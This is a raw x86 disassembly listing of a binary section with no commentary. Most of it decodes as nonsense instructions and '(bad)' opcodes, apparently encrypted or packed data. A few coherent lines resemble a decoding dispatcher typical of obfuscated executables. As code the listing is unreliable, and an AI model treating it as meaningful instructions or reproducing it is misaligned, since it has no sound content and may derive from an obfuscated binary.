  40b7b4:	adc    al,BYTE PTR [esi]
  40b7b6:	mov    ebp,0x7a0b7b00
  40b7bb:	pop    esi
  40b7bc:	(bad)  
  40b7bd:	dec    esp
  40b7be:	arpl   WORD PTR [ecx-0x109541de],bx
  40b7c4:	jl     0x40b814
  40b7c6:	clc    
  40b7c7:	xchg   esi,eax
  40b7c8:	or     eax,0x63255e5f
  40b7cd:	pop    edx
  40b7ce:	sbb    eax,0x7f251b76
  40b7d3:	mov    ds:0x1a0ee01a,al
  40b7d8:	ret    
  40b7d9:	fist   WORD PTR [ecx]
  40b7db:	sbb    DWORD PTR [eax+0x5f],0x4ee5ea9d
  40b7e2:	cmp    cl,BYTE PTR [eax-0x36]
  40b7e5:	jmp    0xcf08:0x6fcb41da
  40b7ec:	push   0xffffffae
  40b7ee:	xor    bh,BYTE PTR [esi-0x686a53a7]
  40b7f4:	popf   
  40b7f5:	enter  0xbd3e,0xbb
  40b7f9:	into   
  40b7fa:	xor    edx,DWORD PTR [eax-0xb04cb6c]
  40b800:	fild   QWORD PTR [edx+0x428187c7]
  40b806:	sbb    ch,0x79
  40b809:	inc    ecx
  40b80a:	mov    esi,0xff7bf5e9
  40b80f:	jnp    0x40b88f
  40b811:	div    BYTE PTR [ecx-0x59184ae0]
  40b817:	(bad)  
  40b818:	pop    ebx
  40b819:	dec    esp
  40b81a:	sub    bh,ch
  40b81c:	loope  0x40b814
  40b81e:	push   ecx
  40b81f:	std    
  40b820:	pop    ds
  40b821:	int3   
  40b822:	sbb    eax,0xb155ff27
  40b827:	icebp  
  40b828:	xor    edx,DWORD PTR [esi+0x31]
  40b82b:	cmp    al,0x46
  40b82d:	test   BYTE PTR ds:0xd010abdb,bl
  40b833:	in     al,0xc9
  40b835:	loop   0x40b7d2
  40b837:	jg     0x40b7c6
  40b839:	(bad)  
  40b83a:	mov    ebx,0x58e71f8a
  40b83f:	dec    edx
  40b840:	mov    bh,0x9
  40b842:	xor    BYTE PTR [ebp-0x2727d1d0],0x28
  40b849:	inc    ebx
  40b84a:	push   ds
  40b84b:	data16 es clc 
  40b84e:	adc    ah,BYTE PTR [edi]
  40b850:	sub    eax,0x6c2d71a2
  40b855:	jb     0x40b84d
  40b857:	fst    QWORD PTR [edx]
  40b859:	not    DWORD PTR [eax]
  40b85b:	and    DWORD PTR [eax+0x73],edi
  40b85e:	dec    esp
  40b85f:	(bad)  
  40b860:	cmp    al,0x14
  40b862:	push   es
  40b863:	lea    ebx,[ebp-0x2f]
  40b866:	shl    DWORD PTR [edi+0x1bfa65f0],cl
  40b86c:	jge    0x40b875
  40b86e:	pop    esi
  40b86f:	dec    esi
  40b870:	pop    edi
  40b871:	mov    al,ds:0x5b236593
  40b876:	push   cs
  40b877:	or     al,0x9c
  40b879:	icebp  
  40b87a:	xor    bl,BYTE PTR [edx-0x7a1c2434]
  40b880:	popf   
  40b881:	jecxz  0x40b881
  40b883:	fisttp DWORD PTR [edi-0x3f74bd4c]
  40b889:	jbe    0x40b894
  40b88b:	dec    esp
  40b88c:	test   bl,bh
  40b88e:	sbb    eax,0x7ddba92b
  40b893:	dec    edi
  40b894:	clc    
  40b895:	pop    ecx
  40b896:	dec    BYTE PTR [esi-0x74]
  40b899:	aaa    
  40b89a:	xor    DWORD PTR [eax],esi
  40b89c:	or     al,0x16
  40b89e:	repnz xchg ebp,eax
  40b8a0:	outs   dx,BYTE PTR ds:[esi]
  40b8a1:	mov    ecx,0x19d98baf
  40b8a6:	rol    ebx,1
  40b8a8:	or     eax,0x814c6ed9
  40b8ad:	mov    DWORD PTR [ecx+0x76],ebp
  40b8b0:	jmp    0x8462:0xff212cf4
  40b8b7:	pop    ss
  40b8b8:	jge    0x40b866
  40b8ba:	inc    edx
  40b8bb:	ds loope 0x40b90b
  40b8be:	jp     0x40b859
  40b8c0:	inc    eax
  40b8c1:	loop   0x40b913
  40b8c3:	mov    ds:0x429e189e,eax
  40b8c8:	xchg   esp,eax
  40b8c9:	push   edi
  40b8ca:	repz in eax,0xb0
  40b8cd:	mov    ds:0x642937f0,al
  40b8d2:	add    eax,0xcc84c64e
  40b8d7:	xchg   ebx,eax
  40b8d8:	pop    ebx
  40b8d9:	aaa    
  40b8da:	and    BYTE PTR [edx],bh
  40b8dc:	scas   al,BYTE PTR es:[edi]
  40b8dd:	pop    eax
  40b8de:	mov    WORD PTR [ebp+0x3b],ds
  40b8e1:	dec    DWORD PTR [ebp-0x63]
  40b8e4:	or     ch,BYTE PTR [ecx+esi*4]
  40b8e7:	jnp    0x40b957
  40b8e9:	xor    eax,0xcbdf6b85
  40b8ee:	mov    bh,0xa7
  40b8f0:	mov    ds:0xc59af178,al
  40b8f5:	mov    ebx,0xfa9799ab
  40b8fa:	dec    ebx
  40b8fb:	push   0xffffffcd
  40b8fd:	cmc    
  40b8fe:	inc    ebp
  40b8ff:	addr16 and al,0xdc
  40b902:	mov    ds:0xef533c5f,al
  40b907:	cmp    ah,ah
  40b909:	dec    ebx
  40b90a:	xchg   ebx,eax
  40b90b:	arpl   WORD PTR [eax+0xd2d4064],sp
  40b911:	lock cmp eax,edi
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	rcr    DWORD PTR [ebp+eiz*8-0x5],cl
  40b941:	sahf   
  40b942:	(bad)  
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b94b:	fcom   QWORD PTR [ecx+0x51]
  40b94e:	jne    0x40b989
  40b950:	jbe    0x40b9ae
  40b952:	mov    cs,WORD PTR [ebx-0x37af1b03]
  40b958:	icebp  
  40b959:	lea    ebp,[esi+0x14]
  40b95c:	xchg   edx,eax
  40b95d:	lea    esp,[ebx+0x186a75ec]
  40b963:	rol    esp,cl
  40b965:	jmp    0x40b929
  40b967:	repnz dec esp
  40b969:	cli    
  40b96a:	xor    al,ah
  40b96c:	scas   al,BYTE PTR es:[edi]
  40b96d:	test   DWORD PTR [eax],eax
  40b96f:	cvtps2pi mm4,xmm2
  40b972:	aas    
  40b973:	pop    eax
  40b974:	xchg   DWORD PTR [ecx+0x676eec70],ebx
  40b97a:	pop    edx
  40b97b:	jnp    0x40b907
  40b97d:	bound  ecx,QWORD PTR es:[eax-0xe]
  40b981:	pop    ebx
  40b982:	cmp    bl,BYTE PTR [esi]
  40b984:	adc    BYTE PTR [esi-0x1beec35a],al
  40b98a:	add    eax,0x7afef037
  40b98f:	daa    
  40b990:	out    dx,eax
  40b991:	in     al,0x65
  40b993:	loop   0x40b9ae
  40b995:	add    bl,BYTE PTR [edi-0x7537fff9]
  40b99b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b99d:	sbb    eax,DWORD PTR [ecx]
  40b99f:	push   es
  40b9a0:	imul   esp,DWORD PTR [eax+eiz*4-0x142e85db],0x21
  40b9a8:	inc    edi
  40b9a9:	xchg   ebp,eax
  40b9aa:	call   0x4b0c:0x91cfc40a
  40b9b1:	sbb    DWORD PTR [edi+0x2810f300],0x39
  40b9b8:	and    esi,eax
  40b9ba:	popf   
  40b9bb:	mov    al,ds:0xfa1089ac
  40b9c0:	rol    DWORD PTR [ebx],cl
  40b9c2:	scas   eax,DWORD PTR es:[edi]
  40b9c3:	mov    esp,0x928b78c1
  40b9c8:	ret    
  40b9c9:	ins    DWORD PTR es:[edi],dx
  40b9ca:	xor    ah,al
  40b9cc:	push   ds
  40b9cd:	mov    DWORD PTR ds:0xfc56b6e4,ecx
  40b9d3:	sub    dl,dh
  40b9d5:	loope  0x40ba22
  40b9d7:	mov    edx,0x1111313b
  40b9dc:	jns    0x40b9ea
  40b9de:	scas   al,BYTE PTR es:[edi]
  40b9df:	mov    ah,BYTE PTR [edi+0x1d733ef7]
  40b9e5:	stc    
  40b9e6:	xchg   edi,eax
  40b9e7:	and    al,0x9c
  40b9e9:	(bad)  
  40b9ea:	mov    al,0xa3
  40b9ec:	loopne 0x40ba1e
  40b9ee:	mov    al,ds:0x63f0374
  40b9f3:	pop    esp
  40b9f4:	mov    fs,WORD PTR [ebx]
  40b9f6:	xchg   ecx,eax
  40b9f7:	in     eax,dx
  40b9f8:	cmp    ch,BYTE PTR [edx-0x38]
  40b9fb:	outs   dx,DWORD PTR ds:[esi]
  40b9fc:	bound  edx,QWORD PTR [esi-0x26c889e3]
  40ba02:	int    0x68
  40ba04:	nop
  40ba05:	mul    DWORD PTR [ebx+eiz*2]
  40ba08:	push   esi
  40ba09:	mov    DWORD PTR [esi],esi
  40ba0b:	out    dx,eax
  40ba0c:	cmp    al,BYTE PTR [edi-0x533f9025]
  40ba12:	mov    ecx,0xfc149b78
  40ba17:	mov    ?,WORD PTR [edx+0x57]
  40ba1a:	out    dx,al
  40ba1b:	or     DWORD PTR [eax],ebp
  40ba1d:	out    dx,eax
  40ba1e:	xchg   esi,ebp
  40ba20:	or     al,0x97
  40ba22:	adc    BYTE PTR [ebx+eiz*1-0x35],ch
  40ba26:	mov    al,ss:0xf1ff5e61
  40ba2c:	int    0x95
  40ba2e:	stos   DWORD PTR es:[edi],eax
  40ba2f:	stos   DWORD PTR es:[edi],eax
  40ba30:	test   DWORD PTR [esi-0x1e],esi
  40ba33:	push   edi
  40ba34:	(bad)  
  40ba36:	sub    eax,DWORD PTR [ebx-0x14037870]
  40ba3c:	and    dl,dl
  40ba3e:	add    BYTE PTR [esi-0x44c854c6],al
  40ba44:	push   esi
  40ba45:	pop    ebp
  40ba46:	xchg   esp,eax
  40ba47:	add    edi,DWORD PTR [edi+0xd]
  40ba4a:	xchg   esi,ecx
  40ba4c:	pop    ebx
  40ba4d:	pusha  
  40ba4e:	imul   ebx,DWORD PTR [edi+edi*1],0xc78d308f
  40ba55:	or     edi,DWORD PTR [ecx+ecx*4+0x31]
  40ba59:	in     al,0x5
  40ba5b:	xlat   BYTE PTR ds:[ebx]
  40ba5c:	mov    dl,0x7a
  40ba5e:	sub    DWORD PTR [ebp-0x15],eax
  40ba61:	loope  0x40ba84
  40ba63:	outs   dx,BYTE PTR ds:[esi]
  40ba64:	mov    dl,0xcf
  40ba66:	mov    BYTE PTR [esi],ch
  40ba68:	std    
  40ba69:	stos   DWORD PTR es:[edi],eax
  40ba6a:	lods   al,BYTE PTR ds:[esi]
  40ba6b:	cmp    DWORD PTR [eax+edx*4-0x65939197],ebx
  40ba72:	push   ebp
  40ba73:	lods   eax,DWORD PTR ds:[esi]
  40ba74:	dec    esi
  40ba75:	aam    0x88
  40ba77:	jecxz  0x40baf7
  40ba79:	jae    0x40ba3a
  40ba7b:	test   BYTE PTR [ecx+0x5405cb82],ch
  40ba81:	inc    edx
  40ba82:	dec    edx
  40ba83:	sub    ah,BYTE PTR [ebx]
  40ba85:	cmp    ah,al
  40ba87:	(bad)  
  40ba88:	sbb    al,0xc9
  40ba8a:	je     0x40ba43
  40ba8c:	out    dx,al
  40ba8d:	mov    eax,0xfab2adf
  40ba92:	inc    ebp
  40ba93:	xor    esp,DWORD PTR [ebx]
  40ba95:	xchg   esi,eax
  40ba96:	jl     0x40ba99
  40ba98:	lods   al,BYTE PTR ds:[esi]
  40ba99:	mov    eax,0xa289e06b
  40ba9e:	cwde   
  40ba9f:	mov    al,BYTE PTR [ebx-0x540e1ad7]
  40baa5:	push   ss
  40baa6:	sbb    BYTE PTR [edx+0x2c],bl
  40baa9:	int3   
  40baaa:	fild   QWORD PTR [esi]
  40baac:	xor    eax,0x5863ee73
  40bab1:	or     al,0x78
  40bab3:	cmovae ebx,DWORD PTR [esi]
  40bab6:	fmul   DWORD PTR [edi+ecx*1-0x6f45e9fb]
  40babd:	xor    DWORD PTR [ebp+0x6],0xd2bcea28
  40bac4:	fldcw  WORD PTR [ebp+ecx*8+0xaaeb7a1]
  40bacb:	fcomp  DWORD PTR ds:0x9bb00a68
  40bad1:	hlt    
  40bad2:	mov    esp,0x97619aea
  40bad7:	outs   dx,DWORD PTR ds:[esi]
  40bad8:	cmp    ebp,DWORD PTR [ecx+0x21]
  40badb:	dec    eax
  40badc:	cli    
  40badd:	inc    ebx
  40bade:	lods   eax,DWORD PTR ds:[esi]
  40badf:	ror    BYTE PTR [ebp+0x5da0aa4d],1
  40bae5:	push   ss
  40bae6:	inc    eax
  40bae7:	xchg   esp,eax
  40bae8:	sbb    dh,BYTE PTR [edx]
  40baea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baeb:	push   ecx
  40baec:	mov    edx,0xf1622c25
  40baf1:	sahf   
  40baf2:	repnz (bad) 
  40baf4:	sub    esp,DWORD PTR [ebp+0x5a]
  40baf7:	mov    cl,BYTE PTR [ecx+0x56f197ca]
  40bafd:	jg     0x40bb0b
  40baff:	xchg   ecx,eax
  40bb00:	into   
  40bb01:	stos   BYTE PTR es:[edi],al
  40bb02:	adc    edi,ecx
  40bb04:	mov    eax,0x33d66a58
  40bb09:	xor    eax,0x1dbf9b7a
  40bb0e:	dec    DWORD PTR [ebp-0x47]
  40bb11:	xor    edx,DWORD PTR [eax+0x25]
  40bb14:	outs   dx,DWORD PTR ds:[esi]
  40bb15:	shl    bh,cl
  40bb17:	jecxz  0x40bb41
  40bb19:	mov    edx,0xe724eb2f
  40bb1e:	stos   BYTE PTR es:[edi],al
  40bb1f:	in     al,0x91
  40bb21:	jmp    0xebc5:0x1f8be3e0
  40bb28:	ss push ecx
  40bb2a:	leave  
  40bb2b:	out    0x7,eax
  40bb2d:	or     DWORD PTR [ebp+0x4e],0xffffffe9
  40bb31:	xor    al,0x34
  40bb33:	jmp    0x8b10:0xe21c9c7b
  40bb3a:	test   eax,0xc2b30ca6
  40bb3f:	pop    ebp
  40bb40:	pop    esp
  40bb41:	or     esp,DWORD PTR [ebx]
  40bb43:	push   es
  40bb44:	gs push 0xffffff86
  40bb47:	jmp    DWORD PTR [ebp-0x296cc2f]
  40bb4d:	rcl    DWORD PTR [ebx+0x59],1
  40bb50:	adc    DWORD PTR [ebp+0x12ca85c4],edi
  40bb56:	(bad)  
  40bb58:	je     0x40bbc0
  40bb5a:	ins    DWORD PTR es:[edi],dx
  40bb5b:	and    edi,edx
  40bb5d:	jno    0x40bb55
  40bb5f:	jns    0x40bb55
  40bb61:	mov    BYTE PTR [ebx+0x6],dh
  40bb64:	cwde   
  40bb65:	jle    0x40baee
  40bb67:	xchg   BYTE PTR [ebx],bl
  40bb69:	mov    DWORD PTR [esi-0x7f1f8c9c],edx
  40bb6f:	xor    eax,0x7d135617
  40bb74:	loop   0x40bbd5
  40bb76:	mov    ebp,0x82564c17
  40bb7b:	jne    0x40bb58
  40bb7d:	sub    DWORD PTR [edi+0x5e],0xe0a611c8
  40bb84:	mov    ch,0xdf
  40bb86:	(bad)  
  40bb87:	cld    
  40bb88:	or     al,BYTE PTR [ebp-0x51]
  40bb8b:	mov    cl,0x4a
  40bb8d:	lea    edi,[eax]
  40bb8f:	mov    bh,0x6c
  40bb91:	or     ecx,DWORD PTR [esi+esi*2]
  40bb94:	xchg   al,ah
  40bb96:	stc    
  40bb97:	iret   
  40bb98:	xor    ecx,DWORD PTR [ebp+0x718eb24f]
  40bb9e:	push   edi
  40bb9f:	pop    ebp
  40bba0:	xchg   ebx,eax
  40bba2:	outs   dx,BYTE PTR ds:[esi]
  40bba3:	inc    ebp
  40bba4:	mov    al,ds:0xd44b7269
  40bba9:	and    eax,0xe86f2fdc
  40bbae:	aaa    
  40bbaf:	jb     0x40bbbb
  40bbb1:	cmp    ebp,eax
  40bbb3:	mov    al,0xd6
  40bbb5:	stos   BYTE PTR es:[edi],al
  40bbb6:	mov    ebp,0x44e4aafc
  40bbbb:	out    dx,eax
  40bbbc:	jg     0x40bbf8
  40bbbe:	mov    ds:0x1afdc8c7,eax
  40bbc3:	stos   DWORD PTR es:[edi],eax
  40bbc4:	fild   QWORD PTR [ebp+ebx*4+0x30e5e3ce]
  40bbcb:	inc    BYTE PTR [eax-0x69]
  40bbce:	fdiv   DWORD PTR [edi+0xf]
  40bbd1:	lahf   
  40bbd2:	lods   eax,DWORD PTR ds:[esi]
  40bbd3:	xchg   ebp,eax
  40bbd4:	xor    eax,ebp
  40bbd6:	push   edx
  40bbd7:	sbb    BYTE PTR [ebx],ah
  40bbd9:	inc    ebx
  40bbda:	push   ss
  40bbdb:	bound  edx,QWORD PTR [ecx+0x70]
  40bbde:	(bad)  
  40bbdf:	cli    
  40bbe0:	(bad)  
  40bbe1:	sti    
  40bbe2:	test   BYTE PTR [edx],ah
  40bbe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe5:	into   
  40bbe6:	dec    ecx
  40bbe7:	mov    BYTE PTR [edi+edi*2-0x76a3bbd1],dl
  40bbee:	in     al,dx
  40bbef:	mov    dh,0x1f
  40bbf1:	sbb    al,BYTE PTR ds:0x47313288
  40bbf7:	dec    esp
  40bbf8:	ficom  DWORD PTR [edx+0x4c]
  40bbfb:	in     al,dx
  40bbfc:	lea    eax,[edx-0x24ce458]
  40bc02:	imul   eax,ebp,0x50a3dae2
  40bc08:	pop    eax
  40bc09:	loope  0x40bbfa
  40bc0b:	sub    eax,0xd02050e1
  40bc10:	jmp    0x9b04:0xd9a223aa
  40bc17:	stos   BYTE PTR es:[edi],al
  40bc18:	popf   
  40bc19:	lods   al,BYTE PTR ds:[esi]
  40bc1a:	aaa    
  40bc1b:	push   ss
  40bc1c:	in     eax,0x3c
  40bc1e:	cli    
  40bc1f:	arpl   WORD PTR [ebp-0x64],cx
  40bc22:	mov    ecx,0x5c6a085c
  40bc27:	xor    eax,0xe462a402
  40bc2c:	hlt    
  40bc2d:	xchg   BYTE PTR [esi+0xf66fbc9],ch
  40bc33:	es xchg ebp,eax
  40bc35:	das    
  40bc36:	stos   DWORD PTR es:[edi],eax
  40bc37:	adc    eax,0xe788dcaa
  40bc3c:	gs inc eax
  40bc3e:	retf   0x94c5
  40bc41:	(bad)  
  40bc42:	rol    DWORD PTR [ebp+0x458b3b73],1
  40bc48:	hlt    
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc86
  40bc7d:	xor    al,0xf9
  40bc80:	ret    0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bc0b
  40bc89:	mov    al,0x6f
  40bc8b:	enter  0xc530,0x44
  40bc8f:	cmp    BYTE PTR [edx],al
  40bc91:	popf   
  40bc92:	icebp  
  40bc93:	out    dx,eax
  40bc94:	mov    esi,0x69cb528f
  40bc99:	mov    ds:0x85bef63b,eax
  40bc9e:	push   0xffffffde
  40bca0:	dec    ebx
  40bca1:	pushf  
  40bca2:	out    0xa5,al
  40bca4:	or     al,bl
  40bca6:	pop    esp
  40bca7:	xor    eax,0x7b4659d7
  40bcac:	jns    0x40bd26
  40bcae:	mov    DWORD PTR [ebx+0x5fbc841a],esp
  40bcb4:	pusha  
  40bcb5:	ja     0x40bce6
  40bcb7:	add    esi,ebx
  40bcb9:	(bad)  
  40bcbb:	inc    edi
  40bcbc:	cli    
  40bcbd:	inc    ecx
  40bcbe:	sub    eax,0xd89de859
  40bcc3:	bound  ebx,QWORD PTR [edi-0x19]
  40bcc6:	icebp  
  40bcc7:	(bad)  
  40bcc8:	sub    edx,esi
  40bcca:	retf   
  40bccb:	aad    0xd8
  40bccd:	aas    
  40bcce:	rcl    DWORD PTR [ecx-0x7dad52e4],0xfa
  40bcd5:	ja     0x40bcca
  40bcd7:	fcmovbe st,st(2)
  40bcd9:	add    esp,0xc9072c0a
  40bcdf:	ja     0x40bcac
  40bce1:	shl    DWORD PTR [esi+edi*8-0x1640194f],1
  40bce8:	jmp    0xec1a26da
  40bced:	xor    BYTE PTR [ebx],cl
  40bcef:	sbb    edi,DWORD PTR [eax+0x2f]
  40bcf2:	mov    dl,0x13
  40bcf4:	ds call 0xea8a88a3
  40bcfa:	out    0x24,eax
  40bcfc:	pop    edi
  40bcfd:	jmp    0x40bc86
  40bcff:	mov    ch,0x5
  40bd01:	push   edi
  40bd02:	mov    ds:0x2286da3f,eax
  40bd07:	dec    esi
  40bd08:	aam    0xbc
  40bd0a:	jge    0x40bd1c
  40bd0c:	rcl    DWORD PTR [eax],cl
  40bd0e:	ins    DWORD PTR es:[edi],dx
  40bd0f:	push   edi
  40bd10:	je     0x40bd90
  40bd12:	mov    ch,0xfa
  40bd14:	fist   WORD PTR [edx-0x4]
  40bd17:	inc    esp
  40bd19:	mov    eax,DWORD PTR [edi-0x2e1d5118]
  40bd1f:	dec    edi
  40bd20:	rcl    DWORD PTR [ecx],cl
  40bd22:	(bad)  
  40bd23:	mov    eax,ebp
  40bd25:	dec    edx
  40bd26:	popf   
  40bd27:	inc    esi
  40bd28:	fisubr DWORD PTR [edx+0x252f65bb]
  40bd2e:	xchg   esi,eax
  40bd2f:	mov    bl,BYTE PTR [eax+0x6]
  40bd32:	xchg   edx,eax
  40bd33:	out    dx,eax
  40bd34:	xchg   esi,eax
  40bd35:	mov    al,ch
  40bd37:	push   esp
  40bd38:	sub    eax,0x8481748b
  40bd3d:	retf   0x70e4
  40bd40:	pop    esi
  40bd41:	add    eax,0x2d84e78
  40bd46:	inc    ebp
  40bd47:	ror    DWORD PTR [ecx-0x1f57be9a],cl
  40bd4d:	xchg   ecx,eax
  40bd4e:	push   es
  40bd4f:	pop    ds
  40bd50:	jmp    0xec7b:0xa210bcc5
  40bd57:	adc    ah,cl
  40bd59:	sbb    eax,0x2c9afb15
  40bd5e:	dec    ecx
  40bd5f:	les    edx,FWORD PTR [ecx-0xf]
  40bd62:	pusha  
  40bd63:	sbb    esp,esp
  40bd65:	inc    edx
  40bd66:	dec    eax
  40bd67:	push   edx
  40bd68:	push   0x2c
  40bd6a:	cmp    al,0x36
  40bd6c:	lahf   
  40bd6d:	jo     0x40bdaa
  40bd6f:	push   esi
  40bd70:	inc    BYTE PTR [ebp+ebp*8+0x1aecfe32]
  40bd77:	mov    dl,0x7e
  40bd79:	mov    ebx,DWORD PTR [edi-0x44df951c]
  40bd7f:	ss and al,0xff
  40bd82:	jns    0x40bdf3
  40bd84:	lods   eax,DWORD PTR ds:[esi]
  40bd85:	int3   
  40bd86:	sti    
  40bd87:	or     eax,0xaf57b3de
  40bd8c:	cmp    esp,DWORD PTR [esi+0x3e]
  40bd8f:	(bad)  
  40bd91:	das    
  40bd92:	not    DWORD PTR [ebx+0x3c13775e]
  40bd98:	cmp    al,0x22
  40bd9a:	frstpm(287 only) 
  40bd9c:	pop    edi
  40bd9d:	dec    edx
  40bd9e:	lds    ecx,FWORD PTR [esi]
  40bda0:	jb     0x40be01
  40bda2:	mov    esi,0xf35a9c5c
  40bda7:	les    ebp,FWORD PTR [eax+ecx*1-0x68]
  40bdab:	mov    al,ds:0x58ab746d
  40bdb0:	or     BYTE PTR [ecx+0x24],dl
  40bdb3:	test   DWORD PTR [edx+0x459ad531],eax
  40bdb9:	sti    
  40bdba:	lods   eax,DWORD PTR ds:[esi]
  40bdbb:	mov    edx,0xeb89c850
  40bdc0:	xchg   esp,eax
  40bdc1:	sti    
  40bdc2:	(bad)  
  40bdc4:	inc    ecx
  40bdc5:	(bad)  
  40bdc6:	bound  ecx,QWORD PTR [ebx]
  40bdc8:	ret    
  40bdc9:	fstp   QWORD PTR [edi-0x53b642ab]
  40bdcf:	mov    edx,0x10baa810
  40bdd4:	inc    eax
  40bdd5:	(bad)  
  40bdd6:	call   0xd6590d3d
  40bddb:	mov    al,0x8e
  40bddd:	out    dx,eax
  40bdde:	(bad)  
  40bddf:	sbb    ch,ch
  40bde1:	ficom  DWORD PTR [eax]
  40bde3:	inc    esp
  40bde4:	adc    BYTE PTR [edx+0x2075ef40],dl
  40bdea:	add    ebp,0xc964df58
  40bdf0:	dec    esp
  40bdf1:	dec    esp
  40bdf2:	and    bh,dl
  40bdf4:	ret    
  40bdf5:	loopne 0x40be1a
  40bdf7:	pop    ecx
  40bdf8:	jns    0x40bdfe
  40bdfa:	cmp    eax,0xf338fed2
  40bdff:	test   DWORD PTR [ebx],eax
  40be01:	test   DWORD PTR [eax],0x56331c16
  40be07:	jns    0x40be41
  40be09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be0b:	add    ebx,DWORD PTR [esi+0x2d]
  40be0e:	xor    eax,0x1da3cc07
  40be13:	mov    ds:0x8af861fa,eax
  40be18:	cwde   
  40be19:	aad    0xdf
  40be1b:	pushf  
  40be1c:	xor    BYTE PTR [edx-0x52a4438a],ch
  40be22:	loop   0x40bdc0
  40be24:	jb     0x40be6f
  40be26:	jo     0x40be9b
  40be28:	dec    ecx
  40be29:	div    dh
  40be2b:	in     eax,0x94
  40be2d:	(bad)  
  40be2e:	jg     0x40be57
  40be30:	mov    dl,0xd5
  40be32:	loopne 0x40be1c
  40be34:	int    0x7d
  40be36:	or     eax,0xe308dcbb
  40be3b:	xchg   BYTE PTR [edx],bh
  40be3d:	int    0x16
  40be3f:	dec    ecx
  40be40:	mov    al,ds:0xa29ca54b
  40be45:	sbb    al,0xcf
  40be47:	pop    es
  40be48:	dec    edi
  40be49:	inc    ebx
  40be4a:	or     ebp,DWORD PTR [edx-0xd]
  40be4d:	push   0x76
  40be4f:	fwait
  40be50:	mov    bh,0xc
  40be52:	inc    ebx
  40be53:	adc    al,0x82
  40be55:	paddb  mm2,mm1
  40be58:	outs   dx,DWORD PTR ds:[esi]
  40be59:	and    esi,esi
  40be5b:	cli    
  40be5c:	int3   
  40be5d:	dec    ebx
  40be5e:	repz adc BYTE PTR [esi+0x46],0xae
  40be63:	out    dx,al
  40be64:	shl    DWORD PTR [edi+0x5a06fb56],1
  40be6a:	jmp    FWORD PTR [ebx+0x59bf274b]
  40be70:	dec    ebx
  40be71:	in     eax,0x5
  40be73:	sbb    BYTE PTR [esi],0x9b
  40be76:	add    al,0x3
  40be78:	pop    ebx
  40be79:	imul   ebx
  40be7b:	ss mov esi,0x32f16d01
  40be81:	pop    es
  40be82:	js     0x40bea7
  40be84:	sbb    BYTE PTR [ecx+edx*1+0x532a44c0],0x30
  40be8c:	dec    ecx
  40be8d:	rol    BYTE PTR [edx-0x413d2ba7],cl
  40be93:	lods   al,BYTE PTR ds:[esi]
  40be94:	pop    ecx
  40be95:	stos   BYTE PTR es:[edi],al
  40be96:	cdq    
  40be97:	push   ds
  40be98:	pop    ebx
  40be99:	dec    edx
  40be9a:	jle    0x40bedd
  40be9c:	lea    esp,gs:[ecx-0x26fe0b33]
  40bea3:	dec    edi
  40bea4:	mov    ecx,0xc162025f
  40bea9:	xlat   BYTE PTR ds:[ebx]
  40beaa:	adc    DWORD PTR [esi],ebp
  40beac:	cmp    bl,BYTE PTR ds:0xc5621ffd
  40beb2:	adc    al,0x68
  40beb4:	in     al,dx
  40beb5:	shl    dl,0xd3
  40beb8:	jne    0x40beb2
  40beba:	or     eax,DWORD PTR [ebx+0x18]
  40bebd:	push   0xf0ae8464
  40bec2:	arpl   WORD PTR [ebx-0x629ad01c],di
  40bec8:	mov    ds:0x1ce8ccf8,al
  40becd:	jle    0x40be5c
  40becf:	mov    ch,0x6f
  40bed1:	push   eax
  40bed2:	cmc    
  40bed3:	add    bl,dh
  40bed5:	and    bl,0x54
  40bed8:	out    0x8f,al
  40beda:	scas   eax,DWORD PTR es:[edi]
  40bedb:	sar    bh,cl
  40bedd:	(bad)  
  40bede:	push   ebx
  40bedf:	loopne 0x40bea9
  40bee1:	out    0x8f,al
  40bee3:	mov    cl,0xe0
  40bee5:	aaa    
  40bee6:	mov    bl,0x20
  40bee8:	mov    ch,BYTE PTR [eax]
  40beea:	push   0x5eb6e1ce
  40beef:	jae    0x40bedf
  40bef1:	pushf  
  40bef2:	aad    0x79
  40bef4:	shl    BYTE PTR [edi],0x45
  40bef7:	mov    ebx,0x4490ea76
  40befc:	data16 scas al,BYTE PTR es:[edi]
  40befe:	dec    ebx
  40beff:	hlt    
  40bf00:	pop    esi
  40bf01:	fnstcw WORD PTR [ebp-0x29]
  40bf04:	repz adc ebx,DWORD PTR [ebp+esi*1-0x7cae0ba1]
  40bf0c:	out    dx,al
  40bf0d:	(bad)  
  40bf10:	add    al,0x96
  40bf12:	xor    al,BYTE PTR [ebx+eiz*1+0xc]
  40bf16:	pop    esp
  40bf17:	inc    edi
  40bf18:	mov    ch,BYTE PTR [esi+eax*2]
  40bf1b:	xor    al,0xd0
  40bf1d:	test   DWORD PTR [ebx+0xf0e5f78],esi
  40bf23:	cmp    edx,DWORD PTR [edi]
  40bf25:	das    
  40bf26:	inc    ebp
  40bf27:	je     0x40bf52
  40bf29:	nop
  40bf2a:	or     eax,0x8b2e650
  40bf2f:	push   ebx
